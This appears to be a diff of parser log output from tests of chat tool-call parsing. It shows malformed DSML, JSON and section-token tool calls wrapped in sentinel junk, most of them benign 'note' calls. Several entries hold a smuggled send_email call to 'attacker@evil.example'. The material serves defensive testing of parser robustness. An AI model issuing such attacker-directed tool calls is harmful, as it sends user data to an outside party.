+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
